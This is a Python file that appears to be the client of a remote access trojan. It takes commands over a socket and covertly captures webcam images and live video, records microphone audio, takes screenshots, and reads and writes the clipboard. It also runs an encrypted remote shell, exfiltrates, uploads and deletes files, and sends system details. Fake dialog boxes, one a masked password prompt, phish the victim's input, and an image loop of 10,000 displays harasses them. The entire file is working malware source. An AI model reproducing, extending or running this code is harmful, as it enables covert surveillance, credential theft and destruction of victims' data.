from os import listdir,chdir,path,remove,getcwd
import socket
from select import select
import cv2
from json import dumps,loads
from numpy import array , uint8
import pyaudio
from time import sleep
from pyautogui import screenshot
from shutil import rmtree
from cryptography.fernet import Fernet
from subprocess import check_output,STDOUT
from pymsgbox import alert,confirm,prompt,password
from PIL import Image
from platform import machine , version , platform ,processor
from platform import system as sysInfo
from psutil import disk_usage , virtual_memory 
from clipboard import paste , copy
def popup(conn,command):
    if command[2:7]=="alert":
        lsCommnand=command.strip().split("|")
        alert(lsCommnand[2],lsCommnand[1])
    elif command[2:7]=="confr":
        lsCommnand=command.strip().split("|")
        lsButtons=lsCommnand[3].split(',')
        resault=confirm(text=lsCommnand[2], title=lsCommnand[1], buttons=lsButtons)
        conn.send(resault.encode())
    elif command[2:8]=="qstion":
        lsCommnand=command.strip().split("|")
        resault=prompt(text=lsCommnand[2], title=lsCommnand[1])
        conn.send(resault.encode())
    elif command[2:8]=="passwd":
        lsCommnand=command.strip().split("|")
        resault=password(text=lsCommnand[2], title=lsCommnand[1], mask='*')
        conn.send(resault.encode())
def HDalert(conn):
    data=''
    while 1:
        RCdata=conn.recv(40000).decode()
        if "END" in RCdata[len(RCdata)-3 : len(RCdata)]:
            data+=RCdata[0:len(RCdata)-3]
            break
        data+=RCdata
    CVimg=array(loads(data)).astype(uint8)
    img=Image.fromarray(CVimg)
    for i in range(10000):
        img.show()
def clipboard(command,conn):
    if command == "GCLPB":
        conn.send((paste()+"ENDeyeRT").encode())
    elif command=="WCLPB":
        data=''
        while 1:
            data2=conn.recv(10000).decode()
            if "ENDeyeRT" in data2:
                data+=data2.replace("ENDeyeRT" , "")
                break
            data+=data2
        copy(data)
def sendInfo(conn):
    if "windows" in sysInfo():
        path=r"C:\\"
    else :
        path='/'
    conn.send(f"{disk_usage(path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode())
def shellRN(conn,key):
    conn.settimeout(600)
    def decryptFS(dataBorS):
        if not type(dataBorS)==bytes:
            dataBorS=str(dataBorS).encode()
        if dataBorS:
            Eobj=Fernet(key)
            res=Eobj.decrypt(dataBorS)
            return res
        else:
            raise AttributeError
    def encryptFS(dataBorS):
        if not type(dataBorS)==bytes:
            dataBorS=str(dataBorS).encode()
        if dataBorS:
            Eobj=Fernet(key)
            res=Eobj.encrypt(dataBorS)
            return res
        else:
            raise AttributeError
    while 1:
        try:
            command=decryptFS(conn.recv(1024)).decode().strip()
        except AttributeError:
            continue
        if command=="GTINFO":
            conn.sendall(encryptFS(f"{socket.gethostname()}[{getcwd()}]"))
        elif "END" in command:
            break
        elif command[0:2]=="cd":
            path=command.strip().split(" ")
            if len(command)==2:
                conn.send(encryptFS(f"So where?"))
            else :
                try:
                    chdir(command[2:].strip())
                    conn.send(encryptFS("None"))
                except :
                    conn.send(encryptFS(f"cd: {command[2:].strip()}: No such file or directory"))
        else:
            if "bash" in command:
                conn.sendall(encryptFS("What do you want from me ?!"))
            else :
                try:
                    out=check_output(command,stderr=STDOUT,shell=True)
                except Exception as e:
                    out =e
                try:
                    conn.sendall(encryptFS(out))
                except AttributeError:
                    conn.sendall(encryptFS("None"))
def takeScr(conn):
    scr=screenshot()
    arr=array(scr)
    RGBlist=arr.tolist()
    dmps=dumps(RGBlist)
    conn.send(dmps.encode())
def getPic(conn):
    vid = cv2.VideoCapture(0)
    ret, frame = vid.read()
    RGBlist=frame.tolist()
    dmps=dumps(RGBlist)
    conn.send(dmps.encode())
def live(conn):
    vid = cv2.VideoCapture(0)
    while 1:
        ret, frame = vid.read()
        RGBlist=frame.tolist()
        dmps=dumps(RGBlist)
        conn.sendall(dmps.encode())
        conn.send("END".encode())
        flag=conn.recv(1024).decode()
        if flag=='end':
            break
        sleep(0.25)
def recSound(conn):
    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = int(conn.recv(1024).decode()) # Get time to record
    p = pyaudio.PyAudio()  
    stream = p.open(format=sample_format,channels=channels,rate=fs,frames_per_buffer=chunk,input=True)
    frames = []  
    for i in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    conn.send(str(p.get_sample_size(sample_format)).encode())
    sleep(0.25)
    for itm in frames:
        conn.send(itm)
    '''
    server : send secs
    This file : send get_sample_size
    This file : send sample_format
    '''
def DirExp(conn,command):
    if command[0:6]=='FXshf:':
        fds=''
        srhFile=command.split(":")[1]
        for fd in listdir():
            if srhFile in fd:
                if path.isdir(fd):
                    fds+="D:"
                else :
                    fds+="F:"
                fds+=fd+"\n"
        sleep(0.5)
        conn.send(fds.encode())
    elif command[0:6] =='FXchd:':
        newPath=command.split(":")[1]
        try:
            chdir(newPath)
            sleep(0.5)
            conn.send(" Done !".encode())
        except FileNotFoundError :
            sleep(0.5)
            conn.send("The path entered is incorrect !".encode())
    elif command[0:6]=='FXdwn:' or  command[0:7]=='4FXdwn:':
        filePath=command.split(":")[1]
        buffer=4096
        try:
            if path.isfile(filePath):
                filesize=path.getsize(filePath)
                if  command[0:6]=='FXdwn:':
                    conn.send(str(filesize).encode())
                with open(filePath,"rb") as BFile:
                    while 1:
                        rdata=BFile.read(buffer)
                        if not rdata:
                            break
                        conn.sendall(rdata)
                if command[0:7]=='4FXdwn:':
                    buffer = 4096
                    with open(filePath ,"wb") as f:
                        while 1:
                            data=conn.recv(buffer)
                            if "END" in str(data[len(data)-3:]) :
                                data=data[0:(len(data)-3)]
                                f.write(data)    
                                break
                            if not data :
                                break
                            f.write(data)
                        f.close()
            else :
                return 1
        except FileNotFoundError:
            conn.send("The path entered is incorrect !".encode())
            return 1
    elif command[0:6]=="FXrmf:":
        filePath=command.split(":")[1]
        if path.isfile(filePath):
            remove(filePath)
            conn.send("Done !".encode())
        elif path.isdir(filePath):
            rmtree(filePath)
            conn.send("Done !".encode())
        else :
            conn.send("Failed! can't find file path !".encode())
    elif command[0:6]=="FXupd:":
        buffer=4096
        filePath=command.split(":")[1]
        try:
            with open(filePath ,"wb") as f:
                while 1:
                    data=conn.recv(buffer)
                    if "END" in str(data[len(data)-3:]):
                        f.write(data[0:len(data)-3])
                        break
                    f.write(data)
                f.close()
        except IsADirectoryError:
            return 1
def commandRunner(conn,command,key):
    while 1:
        sleep(0.25)
        if command=="Tpict":
            getPic(conn)
            conn.send(b"END")
            break
        elif command=="Rsound":
            recSound(conn)
            conn.send(b"END")
            break
        elif command=="Glive":
            live(conn)
            conn.send(b"END")
            break
        elif command=="Tscr":
            takeScr(conn)
            conn.send(b"END")
            break
        elif command[0:2]=="FX" or command[0:3]=="4FX":
            DirExp(conn,command)
            conn.send(b"END")
            break
        elif command=="RMCM":
            shellRN(conn,key)
            conn.send(b"END")
            break
        elif command[0:2]=="WN":
            popup(conn,command)
            conn.send(b"END")
            break
        elif command=="HDalert":
            HDalert(conn)
            conn.send(b"END")
            break
        elif command=="GCLPB" or command=="WCLPB":
            clipboard(command , conn)
            break
        elif command=="Sinfo":
            sendInfo(conn)
            conn.send(b"END")
            break
        else :
            break